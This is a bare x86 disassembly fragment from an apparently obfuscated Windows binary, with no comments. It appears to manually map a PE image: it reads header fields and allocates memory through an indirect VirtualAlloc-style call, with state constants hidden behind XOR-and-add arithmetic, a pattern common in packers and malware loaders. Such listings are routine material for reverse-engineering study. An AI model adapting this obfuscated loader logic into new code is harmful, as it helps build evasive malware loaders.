  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
